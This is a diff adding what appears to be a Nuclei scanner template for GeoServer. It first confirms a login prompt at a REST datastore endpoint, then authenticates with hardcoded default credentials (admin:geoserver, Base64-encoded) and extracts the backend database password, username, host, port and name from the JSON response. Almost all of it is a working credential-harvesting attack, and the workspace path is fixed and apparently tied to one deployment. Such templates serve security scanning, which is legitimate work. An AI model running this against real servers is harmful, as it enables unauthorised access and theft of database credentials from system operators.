@@ -1,0 +1,63 @@
+id: geoserver-basic-authentication
+
+info:
+  name: GeoServer Critical Database Credential Exposure via Default Credentials
+  author: MuhammadWaseem
+  severity: critical
+  description: |
+    GeoServer REST API exposes sensitive backend database credentials when accessed with default or weak credentials.
+    This allows full database compromise, data theft, or manipulation. Immediate credential rotation and access restriction are required.
+  reference:
+    - https://docs.geoserver.org/latest/en/user/security/
+    - https://github.com/geoserver/geoserver
+  tags: geoserver,authentication,critical,default-creds,dataleak,json,misconfiguration,dbcreds
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: unauthenticated-access
+    name: Check for GeoServer Basic Authentication
+    raw:
+      - |
+        GET /geoserver/rest/workspaces/PRTR/datastores/GIS.json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+        Accept: application/json
+    matchers:
+      - type: status
+        status:
+          - 401
+      - type: word
+        part: header
+        words:
+          - "Basic realm=\"GeoServer Realm\""
+
+  - id: authenticated-access
+    name: Access GeoServer Datastore with Basic Authentication (Default Credentials)
+    raw:
+      - |
+        GET /geoserver/rest/workspaces/PRTR/datastores/GIS.json HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46Z2Vvc2VydmVy
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+        Accept: application/json
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "datastore"
+          - "PostGIS"
+          - "GIS"
+    extractors:
+      - type: json
+        json:
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "passwd") | ."$"'
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "user") | ."$"'
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "database") | ."$"'
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "host") | ."$"'
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "port") | ."$"'
+          - '.dataStore.connectionParameters.entry[] | select(."@key" == "dbtype") | ."$"'
